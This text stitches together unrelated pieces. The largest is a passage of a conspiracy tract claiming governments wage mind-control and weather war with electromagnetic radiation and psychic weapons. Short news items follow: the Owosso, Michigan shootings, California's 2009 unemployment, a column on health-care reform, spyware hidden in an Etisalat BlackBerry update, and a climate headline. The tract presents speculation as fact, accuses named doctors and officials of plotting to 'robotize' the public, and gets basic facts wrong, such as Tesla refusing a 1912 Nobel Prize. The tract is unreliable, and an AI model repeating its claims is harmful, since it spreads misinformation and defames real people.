The " woodpecker " has been blamed for subsequent shifts in weather patterns resulting from altered trade winds .
The change of winds created a drought in the western U.S. with severe effects on farming and the U.S. economy ( 45 ) .
Several agencies fear that such standing waves might well have caused the disintegration of ships , including oil tankers , in the Atlantic ( 46 ) .
But their potential effect on human beings causes even greater concern .
Just as the human body 's nervous system operates electromagnetically , so the Earth has an electromagnetosphere which , scientists claim , can be altered to produce dramatic weather shifts .
In fact the earth 's ionosphere oscillates at approximately the same frequency as human brain waves making it a perfect " carrier " off which EMR radiations ( in the brain wave range can be bounced without any change of frequency .
The relationship between the electromagnetosphere and the EM basis of the human body can be exploited as a strategic weapon ( 47 ) .
Everyone has experienced mental and emotional shifts during changes of weather .
Imagine the power open to those who , by flicking a switch , could control the earths atmosphere and change not only the weather but the brainwaves of entire populations .
Both the U.S. and Soviet governments know that a strong pattern exists correlating geophysical phenomena and political disturbances , health , and mood swings .
For these reasons the " woodpecker " signal alarmed the U.S .
XII .
WITH LIGHTENING IN HIS HANDS
For years ; the Soviets , and more recently , the U.S. have explored the possibilities - described ' in the - work of the late Nikola Tesla ( 48 ) .
Tesla came to - the U.S. from Czechoslovakia and worked for both the Edison and Westinghouse companies , where he invented the famous Tesla coil and alternating - current .
Tesla 's discoveries laid the groundwork for TV , radio , telegraphy , death rays , electronic surveillance , dictaphones , air purification devices . , and even technology for the solution to our current energy crisis .
Many of his inventions patented as long ago as 1900 are still so advanced that they cannot be understood or tested ( 49 ) .
This eccentric character migrated from his Waldorf - Astoria suite in New York City , where he dined every night in evening dress at a special table , to a crude Rocky Mountain hideaway laboratory .
He was awarded the Nobel Prize , which he refused , in 1912 .
Tesla was truly the greatest genius of the Twentieth Century .
His Patents and theories have yielded a whole family of invisible weapons .
Intelligence sources in Canada , where effects of tile " woodpecker " signal have been widely experienced , suspect that they come from Soviet military refinements of Tesla 's theories .
The Pentagon has contracted a think tank to construct a modern equivalent of Tesla 's apparati and to expand on his theories .
A long - time Tesla devotee , Robert A. Golka works in a converted AF hangar at Wendover AFB , Utah , Some of the Tesla applications to be explored are the transmission of electrical power over great distances without wires , the generation of death rays , charged particles , and the modification of weather patterns ( 50 ) .
But another Tesla - influenced re searcher has voiced strong concern that the Pentagon may be investigating the strong , pulsating electrical fields within the alpha and beta rhythms of the human brain which , if exploited , could create awesome psychological effects in people .
XIII .
CLOSING THE MIND CONTROL GAP
As early as 1972 , the U.S. Defense Intelligence Agency ( DIA ) ( 51 ) reported on Soviet EMR mind control progress .
The Soviets have been researching EMR mind control for years , going so far as to explore its relationship to ESP ( 52 ) .
Since the 1960's , the DIA has carefully compiled regular analyses of the Soviet work .
What have the two nations discovered ?
Sounds and even words can be made to appear within the human brain , when broadcast from EMR neurological controls at a military base ( 53 ) .
Brainwave entrainment , coronaries , strokes , and epileptic seizures can be triggered by remote control .
The 1976 DIA estimate is labeled , " recommended reading material for those consumers who have an interest in the application of microwave energy to weapons . "
Recent - Pentagon studies attest to a grave concern over Soviet military use of the electromagnetic spectrum and the serious U.S. efforts to surpass them .
The U.S. has attempted to close the EMR mind control gap by coordinating a massive network of universities , think tanks , military installations , and hospitals developing EMR weapons .
One Army report , " Analysis of Microwaves for Barrier Warfare , " describes the use of the microwave band to control populations ( 54 ) .
Although few know it , the French have used invisible wavelengths to control crowds for years ( 55 ) .
A former U.S. intelligence officer even claims that the Nazi 's used a " frenzy machine " to stir up crowds at Hitler 's Nuremburg Rallies .
The French crowd control " sirens " use various inaudible sounds which throw people into terror and cause loss of bowel control en masse .
Former CIA director Richard Helms may very well have had such weapons in mind when he testified before the Warren Commission on June 19 , 1964 .
Then Deputy Director for Plans , Helms warned , " Current research indicates that the Soviets are attempting to develop a technology for control in the development of behavioral patterns among the citizenry of the U.S.S.R. in accordance with politically determined requirements of the system .
Furthermore , the same technology can be applied to more sophisticated approaches to the ' coding ' of information ' for transmittal to population targets in the ' battle for the minds of men . ' " ( 56 )
Both the Soviets and U.S. are covering up their knowledge of invisible weapons .
When originally interviewed by the authors , legal counsel for the State Department 's Disarmament Agency claimed ignorance of such weapons and that , furthermore , they were " speculative and futuristic " ( 57 ) .
Only careful investigation of government papers revealed that State 's counsel was lying and had , in fact , possession of materials concerning invisible weapons ( 58 ) .
Certainly , lie was aware of the Soviet amendment to SALT II which proposed banning of infrasonic and electromagnetic weapons designed to affect biological targets ( 59 ) .
Because of this secret arms race and coverup , the mind control capacity of global EMR systems threatens to turn our world into a zombie planet .
XIV .
MAGICAL MYSTERY MURDER
Throughout the globe , an underground physics network acts as a thorn in the side of the invisible warriors , studying the latest developments of paraphysics and openly publishing its findings ( 60 ) .
Such colorful characters as Bob Beck of Los Angeles ' Biomedical Research Associates fly back and forth from Washington to Eugene to Canada , sharing findings and investigating suspected government environmental crimes .
Members of this loosely - knit network share their information freely and are concerned about the mind control aspects of the invisible war .
A former military intelligence officer , Lt. Col. Thomas E. Bearden , USAF ( Ret. ) , publishes SPECULA , a magazine dedicated to " psychotronics " and " bio-energetics " .
These two words describe what amounts to the electronic amplification of telepathy and what has heretofore been called ESP .
Bearden is not just a concerned amateur , he is an experienced scientist who has several of his psychotronic weapons papers on file at the Defense Documentation Center outside Washington ( 61 ) .
The story of his fight to publish a book on the subject of psychotronics and bio-energetics , THE EXACLIBUR STATEMENT , is as full of cloak - and - dagger intrigue as an Ian Fleming thriller ( 62 ) .
Bearden 's book was due out in 1978 , but has been " mysteriously " delayed .
During the time he was preparing the manuscript for publication , one by one , the members of the " network " met strange fates .
One such incident is the Ira Einhorn Murder Mystery .
Einhorn , an organizer of the " network " , directed some of Congressman Rose 's efforts from behind the scenes at the House of Representatives .
One day Einhorn was shocked to discover the long dead body of his fellow researcher in a trunk on his back porch ( 63 ) .
When murder charges were pressed against Einhorn by the FBI , Einhorn launched a passionate defense which resulted in a great press controversy and a long court battle to get the evidence against .... ( text missing ) and currently Einhorn is hiding , convinced he was framed .
But who framed him ?
It could have been U.S. , Soviet , or British Intelligence ( 64 ) since Einhorn freely exchanged information with any group or individual who requested it .
In hindsight , he suspected that some people who requested hard to get Tesla papers may have been working for foreign intelligence agencies .
We examine the FBI case documents and other investigations which pose some intriguing questions about the Einhorn case .
While fighting the invisible war , the U.S. cryptocracy may well have attacked this network the same way it attacked the civil rights and anti-war movements of the Sixties .
XV .
RIVER STYX
The newly dead souls of ancient Greece had to ford two streams before they were admitted into Ha des .
The first , the River Lethe , erased all memory of having lived in the minds of those immersed in its waters .
The second , the River Styx , baptized the newly deceased Greek , making the soul " dead forever " and admitting it through the Gates of Hades .
With the same ghoulish humor they 've exhibited in the past , the creators of one of the Pentagon 's first invisible weapons must have envisioned themselves as Gods of the Underworld when they named the secret U.S. Army IV project RIVER STYX .
RIVER STYX WEAPONS ( RSW ) were among the first prototype ( 65 ) electromagnetic weapons .
RSW utilized microwaves to " grossly degrade bodily functions " of " the brain , the testes , the eyes , and like organs . "
Further , the creators of RSW claimed " there are paraphysical advantages that my accrue to the country and allied nations from the early realization of military applications of these effects . "
Through interviews with RSW principals and research into the background of the project , light is shed on how the U.S. Army worked on paraphysical IW as early as 1957 .
The RIVER STYX story also reveals that neither the Pentagon nor the CIA have ever been quite as naive about microwaves and other EMR weaponry as they publicly claimed .
We also show that not only has the U.S. government been witting of such weapons , they have coordinated various Pentagon and Intelligence agencies , corporations , and universitites towards their development since the 1950's .
This statement in the STYX Report reveals why the U.S. government has pulled such a massive coverup .
" Should developments in this type weapon be undertaken and should they become known to the public , charges from public and foreign sources that this is an atrocity weapon may be made and should be anticipated . "
Such weapons were considered at their inception as being as crucial as nukes and were the predecessors of those invisible weapons which now threaten life as we know it .
According to one Pentagon study , the Army has conducted microwave experiments which produced third degree burns on the " subjects " at the Medical Research Lab at Fort Know , Kentucky .
General Electric , building on its earlier independent developments of antipersonnel microwave weapons , participated in Project COMET which researched the psychological effects of EMR .
These projects spanned the EMR spectrum from radiowaves to microwaves ( 66 ) .
Very rarely has the U.S. government leaked bits of information about its IW arsenal to the public .
Particularly revealing is one statement concerning weather manipulation by former Pentagon think - tank researcher , Lowell Ponte : " The right kind of radio transmissions alter the planet 's magnetic field ...
The giant rivers of wind in the sky , like the jet stream , tend to follow that magnetic field .
So when you bend it or when you begin creating giant standing waves in the atmosphere , as our government knows they 've been doing , you bend those wind currents , and where they go the weather goes . " ( 67 ) .
Canadian intelligence similarly released a Reuters wire on August 9 , 1975 describing " introduction of electromagnetic waves into the .environment . " ( 68 ) Aside from the already dangerous implications of weather warfare and the indirect effect on the human mind , allusion to direct mind control factors have been studiously omitted .
The research is tracked thorough Canadian intelligence sources and other materials to show the relationship between ELF - and the entrainment of human brainwaves .
Development of microwave " hearing " and " amnesia beams , " and the current massive effort underway to develop the electromagnetic pulse ( EMP ) , including war games at New Mexico 's Kirtland AFB , opens the door to reveal the massive IW R&D network throughout the U.S .
On the heels of the Moscow and Eugene Signals , the " woodpecker " , Einhorn Murder Case , and River Styx , a clandestine arsenal stands poised , aimed at the human mind .
XVI .
" OH GIVE ME A HOME , WHERE THE ZOMBIES ROAM ....
" It is more dangerous than atomic destruction , " warns CIA funded physiologist Dr. Jose Delgado , " Because in our wisdom we may destroy the planet .
But through our knowledge of the brain , we may transform , we may shape , direct , robotize man .
I think the great danger of the future is ... that we will have robotized human beings who are not aware that they have been robotized . "
( 69 ) Delgado ought to know .
As- father of Electronic Stimulation of the Brain ( ESB ) , he helped spawn the Invisible War .
For years , Delgado has worked to perfect techniques enabling psychiatrists to control humans with radiowaves through electronic " transponders " implanted in the brain .
Today , Delgado 's theories are being developed further at UCLA , under the auspices of Los Alamos Scientific Laboratories ( 70 ) , better known as the Home of the Atom Bomb .
At Loma Linda VA Hospital , a close personal friend of Dr. Delgado's , Dr. W. Ross Adey , works furiously to develop new techniques for controlling the human brain with exotic energies .
( 71 ) Adey was personally given a prototype of the Soviet LIDA mind control device ( 72 ) .
The Lida is designed to broadcast the three components of pain -- heat , cold , and electricity -- in such a way that the human mind receives them at great distances .
The man whom the Soviets chose to introduce the Lida into American research also works , in cooperation with the U.S. government 's covert mind control operations .
Pioneer biocyberneticist Dr. Craig Fields , at his Pentagon DARPA laboratories , masterminds the developments of new techniques which may soon create the first robotized army and electronically controlled human population ( 73 ) .
From the early work in CIA 's cruder mind control forms , top ranking members of the AMA and APA , key figures of American psychiatry and medicine , have used massive public funds to create a national mind control network .
Their own documents prove their ultimate goal -- to robotize America ( 74 ) .
Far - fetched ?
In this chapter these august figures go on record for a Zombie America .
Perhaps the greatest champion of Zombie America is one of the most respected figures in American Psychiatry today -- Dr. Louis Jolyon " Jolly " West .
Beginning with brainwashing work for the Air Force , ( 75 ) MKULTRA work with CIA ( 76 ) , West has positioned himself smack in the midst of the Invisible War .
West 's career appears to be a carefully constructed espionage " cover " .
Always on the forefront of IW technology , West proposed converting a NIKE Missle base in the Santa Monica Mountains into an IW compound ( 77 ) and received powerful support from then - Governor Ronald Reagan .
West 's proposals included chemical castration , implantation of transponders in sexual organs and the brain , biological control of women 's menstrual cycles to control crime , and eventual replacement of the U.S. legal system with psychiatric control .
" Jolly "
West continues his clandestine mind control activities from his august Chair of Psychiatry and Directorship of the Neuropsychiatric Institute at UCLA .
A mutual friend of both West and Delgado is Dr. Frank Ervin .
Michael Crichton 's novel and film , THE TERMINAL MAN , was based upon an Ervin victim who complains to this day that his brain is being controlled by microwaves .
( 78 ) Remarkably , the CIA funded UCLA work to develop microwave broadcasting equipment which could carry human voices into a victim's head for the purpose of inducing hypnosis at a distance ( 79 ) .
Yet another center tied to UCLA tried to develop a microwave " amnesia " bean , for the CIA as early as the 1950's ( 80 ) .
Proponents of IV !
Psychiatric techniques have somehow managed to take their places beside American presidents for the past twelve years .
Nixon and Ford were advised by Dr. Arnold Hutschnecker , a 1926 graduate of the Nazi- supported Kaiser Wilhelm Institute , where much of the early medicalpsychiatric IW techniques were pioneered .
Carter 's confidante , psychiatrist ' .
Dr. Peter Bourne , has devoted much of his career to psychological warfare and IW technology , and even prescribed hypnotic drugs to White House staffers .
Indeed , financial consultant and investigative journalist Dr. Harry Schultz has speculated that Bourne 's control of Carter may have resulted in some most unusual - policy decisions .
[ Ronald Reagan , who has supported West 's most bizarre schemes for years , could well appoint him to a White House post ] .
Unless the association of IW psychiatrists with U.S. presidents is halted soon , we could see Zombie America come early .
PART FOUR -- THE ULTIMATE IW WEAPON : PSYCHOTRONIC WARFARE
XVII .
THE TOTH INCIDENT
From weapons of deadly germ clouds , armies of genetic mutants or civilian populations subdued by radiowave mind control it's a short jump to psychotronic weapons -- aggressive forms of psychic energy .
Researchers have speculated on this possibility for years ( 81 ) , but not until the KGB arrested Los Angeles Times Moscow correspondent Robert Toth in 1977 did the true story begin to surface .
Bob Toth was arrested for spying on Soviet military parapsychology secrets .
Declassified documents including telexes between Secretary Vance and Ambassador Toon added to Toth 's own description of his KGB interrogation reveal the seriousness of psychic weapons ( 82 ) .
The Soviets began developing parapsychology when Stalin retained a personal psychic , Wolf Messing ( 83 ) .
Since the beginning of recorded history , military strategists have pursued the " black arts " seeking to harness psychic energy ( 84 ) .
The CIA began taking the dark side of the occult seriously in the early fifties ( 85 ) .
Today , parapsychology has evolved into a high tech subject called paraphysics .
It is a science guided by some of the world 's top physicists and psychologists ( 86 ) .
DIA estimates and other intelligence studies analyze the state - of - the- art in paraphysics and plan for its application to psychic spying , telepathic hypnosis , and even the psychic sabotage of enemy defense systems ( 87 ) .
By their own admission , the intelligence agencies of the U.S. government consider the use of " bio-energetics " their most jealously guarded secret ( 88 ) .
XVIII .
GHOST AGENT
The CIA 's interest in ESP was guided by Andrija Puharich , who later played - mentor to psychic Uri Geller ( 89 ) .
Following the death by execution of star CIA double agent Col.
Oleg Penkovsky , the Agency tried to recruit his ghost to spy on the Soviets ( 90 ) .
XIX .
PROJECT SCANATE
After two U.S. psychics ( former UN diplomat Ingo Swann , and former Burbank Police Chief Patrick Price ) penetrated one of the most closely guarded security systems of the Pentagon ( 91 ) , one security officer exclaimed that their mental feats made modern security precautions obsolete .
Price and Swann participated in secret Project Scanate ( 92 ) , one of many such projects conducted by think tanks such as SRI for the CIA and Pentagon .
Shortly after Scanate , Price died under mysterious circumstances , leaving Swann to continue his psychic research at SRI with a low profile -- afraid for his life ( 93 ) .
Like all IW weapons , the government considers paraphysics absolutely top secret .
One TOP SECRET study prepared by SRI for the Air Force , Advanced Technique Threat Assessment , details the entire spectrum of invisible weapons including paraphysics ( 94 ) .
In 1979 , Rep. Charlie Rose of the House Intelligence Committee demanded congressional investigation of U.S. psychic preparedness .
Rose claimed to have witnessed Swann and others in action .
Today , Rose is strangely silent .
Further investigation , however , demonstrated that the psychic arms race continues .
XX . CONTROLLING THE SOUL
While racing to develop psychic arms , both U.S. and Soviet cryptocracies publicly debunk the subject .
While the CIA was researching similar techniques , it 's sister agency , the FDA , jailed famed psychologist Dr. Wilhelm Reich .
Today it might be said that Reich was jailed for publishing paraphysics research openly .
Media shills have been touting the " national security " disinformation line on ESP for over thirty years .
Reich was crazy they said , while the " orgone energy " he was exploring was secretly called " bio-energy " by the government circles who were quite seriously researching it on their own .
Today , despite CIA involvement in Jonestown , psychiatrists who work with CIA mind control programs blame religion for brainwashing ( 95 ) .
The debunking of parapsychology smacks of the atomic disinformation campaign conducted by the Pentagon during the Manhattan Project ( 96 ) .
Only a few years before Hiroshima prominent atomic scientists scoffed at the very idea of atomic power , much less the Bomb .
As Congressman Rose hinted , the debunkers may be working , wittingly or otherwise , to coverup the truth about the government 's attempt to harness the very soul for covert purposes .
PART FIVE -- FREEDOM VERSUS SLAVERY
XXI .
COVERUP
Martin Luther King fought hard for the civil liberties of black people .
In retaliation , the FBI launched an " anti-King " campaign which may have resulted in his death ( 97 ) .
Indeed , the entire civil rights and antiwar movements may have .
been wrecked by the FBI COINTELPRO ( 98 ) and CIA CHAOS operations .
The evidence shows that those cryptocrats who seek to destroy liberty at its source -- our very minds -- will stop at nothing to defame and even murder those who resist enslavement .
Modern technology has made the human mind the battleground for humanity 's struggle for liberty .
Since scientists comprise much of the vanguard of totalitarianism ( 99 ) , mental liberty may be today 's most vital issue .
During the early days of MKULTRA , a former Naval officer , L.Ron Hubbard , -- aware of what the Navy was covertly doing - researched the workings of the human mind ( 100 ) .
Refusing to submit to government demands that he Join the mind control psychiatrists , this man published a book called " Dianetics , The Modern Science of Mental Health " .
The book proclaimed mental liberty and integrity as the birthright of humanity ( 101 ) .
When the book became a bestseller , thousands began using the techniques Hubbard discovered , testifying to " increased mental liberty . "
Some of the techniques Hubbard described for the benefit of people were secretly being used by the government in an attempt to enslave .
Other of the techniques Hubbard described were actually antidotes to the MKULTRA mind control methods ( 102 ) .
The government began a vicious smear campaign against Hubbard .
It was run by the CIA 's mind control section .
The young author had inadvertently blown the whistle on the best kept secret of the Cold War , MKULTRA .
And , perhaps the young author had tipped the cryptocracies hand on their whole IW gameplan .
Hubbard 's office was ransacked and a manuscript was stolen which contained information which paralleled that which we now know of as psychotronics .
Ironically that manuscript carried the same title as the later manuscript by Lt. Col.
Tom Bearden .
Both had the name EXCALIBUR .
Hubbard and his colleagues were physically attacked , and the author narrowly escaped a kidnapping attempt .
A black propaganda campaign was waged against all those who subscribed to the idea of " Dianetics " for nearly 30 years .
When a prominent psychiatrist , Dr. Thomas Szasz began debunking the totalitarian mind control plans of his colleagues in the 1950's ( 103 ) , he became the focal point of similar attacks .
When Adrija Puharich began revealing too much about psychotronics in his books , he was attacked similarly .
Other men like Szasz and Hubbard have sparked a growing movement to restore mental freedom .
Szasz helped launched the fledgling Libertarian Party , whose platform boldly calls for a -halt to government mind control operations and its financing by U.S : tax dollars .
Indeed , the financing through taxation of a technology to ensalve the tax payer , may turn out to be the cruelest joke yet played upon the American people .
XXII DIRTY MONEY FOR DIRTY TRICKS
Following decades of intense lobbying by the mind control psychiatrists and psychiatric - medical establishment , the U.S. government made plans to establish mega-agencies , such as HEW and VA .
It can be no coincidence that through these agencies many of the atrocities of the Invisible War have been committed .
Although supported by many idealistic individuals , these bureaucracie gave birth to a network of human experimentation which made IW arsenals possible .
( 104 ) Mind control and IW projects were among the very first funded by the mega agencies , and as time went on they comprised a major part of their research activities ( 105 ) .
Billions of dollars have been leached from tax coffers to pay for mind ' control programs and invisible weapons development .
Vie trace the organization diagram of the sprawing mind control arsenal which is aimed straight at the dream of liberty .
XXIII .
THE INVISIBLE WAR
An exciting , if chilling scenario of an invisible war based upon one recently declassified intelligence estimate .
CBW , EMR , psychotronic weapons and mind control in all its hideous reality .
XXIV .
HOW TO DEFEND YOURSELF
Rational self - reliance and an understanding of how the human mind works are the best protection against IW .
Do n't look to national governments for help , they 're attacking you .
Do n't look to psychiatry , they 're developing weapons to destroy the very seat of liberty -- your mind .
Do n't rely on authority .
Obedience to authority is the first act of submission to suggestibility .
Suggestibility is the first step of surrender to mind control .
If it is n't true for you it is n't true .
Your own integrity is your best hope .
Ethical scientists may develop IW countermeasures .
Good men may reform governments .
But ultimately your own survival depends on yourself .
As long as people know this , freedom will survive .
The world is what you make it , or what you fail to make it .
Freedom is a continuing struggle , won one moment at a time .
There are many who would take it from you , but no one who can give it to you .

( CNN ) -- Authorities have charged an Owosso , Michigan , man with two counts of first - degree premeditated murder in the Friday shooting deaths of an anti-abortion activist and another man , a prosecutor 's office said .
Activist Jim Pouillon was shot and killed Friday while protesting outside Owosso High School .
Authorities say the suspect , Harlan James Drake , was offended by anti-abortion material that the activist had displayed across from the school all week .
Drake , 33 , is accused of shooting anti-abortion activist Jim Pouillon , 63 , and Michael Fuoss , 61 , who were killed in separate locations Friday morning , the prosecutor 's office in Shiawassee County said .
Authorities also have charged Drake with a felony firearm count and carrying a dangerous weapon with unlawful intent , the prosecutor 's office said .
Drake also is suspected of " attempting to locate a third victim without success , " the office said .
He was arraigned Friday and is being held without bail , the office said .
It was not immediately known whether he had an attorney .
Pouillon , whose anti-abortion activity was well - known in the area , was protesting across the street from Owosso High School about 7:20 a.m.
Friday when he was killed by several shots fired from a passing vehicle , Owosso Police Chief Michael Compeau said .
Watch Compeau talk about the incident »
Several people witnessed the shooting , and one was able to provide a license number , he said .
About an hour later , Owosso police officers found the suspect , Compeau said .
" At the time of his arrest , the suspect made statements that he was involved in another homicide in Shiawassee County the same day , " he said .
Sheriff George Braidwood said a call had come to a 911 dispatch center about 8:17 a.m. saying that an employee at Fuoss Gravel , outside Owosso , had discovered the owner , Michael Fuoss , dead .
He had been shot several times , Braidwood said .
Authorities believe that Fuoss and the suspect knew each other , Braidwood said .
According to Sara Edwards of the county prosecutor 's office , authorities do not believe that Drake knew Pouillon .
Operation Save America , the anti-abortion group of which Pouillon was a member , said in a written statement that he was " well known for his love of Christ and unborn children . "
The Owosso school district went into immediate lockdown after the shooting outside of the high school and remained so until the suspect was in custody , Compeau said
The high school 's administration offered parents the option of picking up their children , he said .
All after - school activities were canceled , he added .
Owosso , a town of about 15,000 people , is about 25 miles west of Flint , Michigan .

California ’s unemployment rate in May hit 11.5 % -- its highest level in more than three decades -- but the pain of losing work is n’t being shared equally between the sexes .
The state lost 68,900 jobs in May as unemployment rose from a revised 11.1 % in April and 6.8 % in May 2008 .
This is the highest rate since the national record - keeping system began in 1976 .
Out of every four jobs lost nationwide since the recession began in December 2007 , three have been lost by men .
Some experts have dubbed the phenomenon a “ mancession . ”

In California , the gap between the two groups has been widening since the end of August .
Back then , the unemployment rate over the preceding 12 months was the same for men and women , 6.3 % .
By May , the 12 - month rate was 9.6 % for men and 8.2 % for women .
The result : Pressure on households that once had two earners and were relatively comfortable .
“ Now there are many families in which the woman is the sole earner ” and the man has been laid off or is working part - time , said Lauren Appelbaum , a UCLA researcher .
The loss of the man ’s earnings makes it hard for once - middle - class families to make ends meet because the average female worker earns just 78 % of what a man gets in a similar occupation , Appelbaum said .
Men are suffering more in this downturn because they are heavily represented in construction and manufacturing , two of California ’s most devastated industries .
Women have gravitated toward healthcare , education , government and other service fields that have not shed as many jobs as the male - dominated sectors .

Indeed , Friday ’s jobs report noted that education and health services were the only parts of the economy that added jobs last month .
The loss of a father ’s income often leads to cancellation of health insurance for a whole family , said Heather Boushey , senior economist at the Center for American Progress , a left - leaning think tank in Washington .
And with more women serving as breadwinners when their husbands are unemployed and out searching for work , it ’s essential that women have access to paid sick leave , she added .
Marian Lorimer is one such woman .
Last year , the former stay - at - home mom snagged a job as a substitute special education teacher at a school district near her home in Camarillo .
Her husband , Matt , has been looking for work for more than a year after being laid off as a warehouse manager .
“ She applied and got hired , just like that , ” Matt Lorimer said , noting that his wife ’s salary helps but is n’t enough to support the family .
Advertisement
Jon Lieber of Westlake Village also is a stay - at - home dad when he ’s not out looking for work .
He ’s had trouble finding another job in the securities industry since being laid off in September .
Now he perfects his spaghetti-and - meatballs recipe and grills chicken and burgers when his wife , Deborah Gallant , is busy with her consulting business .
“ I spend a lot more time grocery shopping , picking my daughter up from school , ” he said .
“ It was n’t something I was doing when I was working 50 hours a week . ”
There could be more men in his position if the jobs picture , as is expected , gets worse before it gets better .
A trio of economic reports predicted that the upswing wo n’t happen before early next year .
Recent forecasts from the UCLA Anderson School of Management , Chapman University and Beacon Economics , a Los Angeles consulting firm , predict that unemployment in the state will peak between 12.1 % and 12.8 % , possibly as early as year ’s end .

“ We believe the recession at the state level should end by mid-2010 , when job creation will start , ” said Esmael Adibi , a Chapman economist .
But for now , California continues to bleed jobs , more so than most of the rest of the country .
The national unemployment rate for May was 9.4 % , and only four states had higher jobless numbers than California : Michigan at 14.1 % , Oregon at 12.4 % and Rhode Island and South Carolina , tied at 12.1 % .
California , which has 11 % of the country ’s workforce , accounted for 1 out of every 5 jobs lost last month .
The state has been vulnerable to paralyzing inactivity in fields related to real estate , including construction , financial services and home - related retail sales .
“ Until we see real estate stabilizing , which it is not , we are not going to see significant improvements in the California economy , ” said Sung Won Sohn , an economist at Cal State Channel Islands .
Advertisement
What ’s worse , Sohn said , is that weakness in real estate is spreading to commercial properties .
The dearth of activity in real estate , housing and construction is being felt particularly in the Inland Empire , where unemployment rose in May to 13 % from 12.7 % the month before .
Joblessness jumped in Ventura County to 9.5 % from 9.3 % , and it rose in Orange County to 8.6 % from 8.4 % .
Other economists said they were disappointed that California ’s labor market , unlike that of the nation , is n’t showing signs of hitting bottom .
“ I was hoping that the job loss would be smaller , but it ’s about the same as it ’s been the last three months , ” said Howard Roth at the state Department of Finance .

By Robert Samuelson - September 14 , 2009
WASHINGTON --
We cannot , it seems , have a candid national conversation on health care .
President 's Obama speech the other night was a brilliant performance , and it may improve prospects for congressional passage of his " reform . "
But no possible plan will fix the " health care problem " for all time .
When Obama says that " I am not the first president to take up this cause , but I am determined to be the last , " he is indulging his ambition for a special place in history and illustrating why Americans do n't discuss health care honestly .
The political problem was simple : support for " reform " was collapsing .
In April , 43 percent felt they'd be better off with his " reform " and only 14 percent did n't , according to a poll by the Kaiser Family Foundation .
By August , it was 36 percent to 31 percent .
To restore momentum , Obama needed to convince more people that his program would help them .
Americans generally want three things from their health care system .
First , they think that everyone has a moral right to needed care ; that suggests universal insurance .
Second , they want choice ; they want to select their doctors -- and want doctors to determine treatment .
Finally , people want costs controlled ; health care should n't consume all private compensation or taxes .
Appealing to these expectations , Obama told Americans what they want to hear .
People with insurance wo n't be required to change plans or doctors ; they 'll enjoy more security because insurance companies wo n't be permitted to deny coverage based on " pre-existing conditions " or cancel policies when people get sick .
All Americans will be required to have insurance , but those who can't afford it will get subsidies .
As for costs , not to worry .
" Reducing the waste and inefficiency in Medicare and Medicaid will pay for most of this plan , " Obama said .
He pledged to " not sign a plan that adds one dime to our ( budget ) deficits -- either now or in the future . "
If you believe Obama , what 's not to like ?
Universal insurance .
Continued choice .
Lower costs .
The problem is that you can't entirely believe Obama .
If he were candid -- if we were candid -- we 'd all acknowledge that the goals of our ideal health care system collide .
Perhaps we can have any two , but not all three .
If we want universal insurance and unlimited patient and doctor choice , costs will continually spiral upward , because there will be no reason or no one to stop them .
We have a variant of that today -- a cost - plus system , with widespread insurance and open - ended reimbursement .
Higher costs push up premiums and taxes .
That 's one reason health spending has gone from 5 percent of gross domestic product in 1960 to 16 percent in 2007 .
( Other reasons : new technologies , rising incomes . )
But controlling spending requires limits on patients and doctors .
Studies of various health proposals conclude that their long - term costs exceed their long - term financing .
In its second decade ( 2020 - 2029 ) , H.R. 3200 -- the main House bill -- would increase federal budget deficits by $ 1 trillion , estimates the consulting firm Lewin Group .
Total health spending would reach 28 percent of GDP by 2029 .
How can Obama claim to control costs and never add to the deficit ?
Well , he 'd adopt a provision requiring " more spending cuts if the savings we promised do n't materialize . "
Sound convincing ?
It is n't .
Congress often enacts automatic triggers to control spending .
The triggers usually do n't work .
When they might bite , Congress delays or modifies them .
Consider one trigger : the " sustainable growth rate " ( SGR ) that Congress created in 1997 to control doctors ' spending under Medicare .
Since 2002 , the SGR formula has consistently called for annual cuts in doctors ' reimbursements .
Congress has routinely overridden the formula .
Now , there 's pressure to scrap the whole SGR .
Obama 's selling of " reform " qualifies as high - class hucksterism , but in fairness , many conservative opponents match or exceed his exaggerations and distortions with low - class fear - mongering .
These critics charge that Obama would curtail Medicare benefits or create " death panels " to deprive ill seniors of desirable care .
Not only are these charges mainly false ( as Obama says ) , but they wrongly suggest that we put some important subjects off - limits .
Medicare represents one - fifth of personal health spending .
Why should n't we debate what should be covered and who should pay ?
Similarly , doctors , patients and families should discuss end - of - life care .
It 's not just that 25 percent to 30 percent of Medicare spending occurs in patients ' last year .
Expensive , heroic care often compounds suffering .
The candor gap reflects a common condescension .
One side believes it must fool Americans into thinking " reform " will do more than it will ; the other thinks it must frighten Americans into believing that it will harm them in ways that it wo n't .
Given Americans ' contradictory expectations , any health care proposal can be criticized for offending some popular goal .
We refuse to face unavoidable -- and unpleasant -- choices .
An update pushed out to BlackBerry users on the Etisalat network in the United Arab Emirates appears to contain remotely - triggered spyware that allows the interception of messages and emails , as well as crippling battery life .
Sent out as a WAP Push message , the update installs a Java file that one curious customer decided to take a closer look at , only to discover an application intended to intercept both email and text messages , sending a copy to an Etisalat server without the user being aware of anything beyond a slightly excessive battery drain .
It was , it seems , the battery issue that alerted users to something being wrong .
Closer examination ( as reported by itp.net ) seems to indicate that all instances of the application were expected to register with a central server , which could n't cope with the traffic - thus forcing all the instances to repeatedly attempt to connect while draining the battery .
A more phased reporting system might have escaped detection completely .
The update is labelled : " Etisalat network upgrade for BlackBerry service .
Please download to ensure continuous service quality . "
The signed JAR file , when opened , reveals an application housed in a directory named " / com/ss8/interceptor / app " , which conforms to the Java standard for application trees to be named the reverse of the author 's URL .
( " Interceptor " is n't the subtlest name for spyware , though . )
SS8 , however , does author applications of exactly this type , and further reverse - engineering of the Java app shows code capable of intercepting messages and copying them to remote servers - a process that starts once a trigger message ( containing the word " start " and originating from a specific number ) has been received .
No one from Etisalat , RIM , or SS8 is saying anything about the issue , despite the fact that the application appears remarkably difficult to remove .
Enterprising hackers , though , have discovered it can be done , with one providing a useful utility ( seventh message down ) to automate the process .
While text messages and phone calls are usually more easily intercepted at the network operator , the BlackBerry architecture does n't lend itself to that kind of legally - authorised interception , which has caused problems in several other countries .
It seems probable that this application was an attempt by the authorities to circumvent that architecture , and it will be interesting to see if a similar application appears on competing UAE operators .
That 's assuming anyone notices - the application could have been missed entirely .
Once it was installed and registered with the server it would have lain dormant until the operator decided to activate it , presumably only on a few phones owned by people of particular interest to the authorities .
Hopefully punters will be a little more careful when considering a downloaded update , although it 's possible the operators may in turn get a little better at hiding it . ®
German Climate Adviser ' Industrialized Nations Are Facing CO2 Insolvency '
In a SPIEGEL ONLINE interview , Hans Joachim Schellnhuber , the German government 's climate protection adviser , argues that drastic measures must be taken in order to prevent a catastrophe .
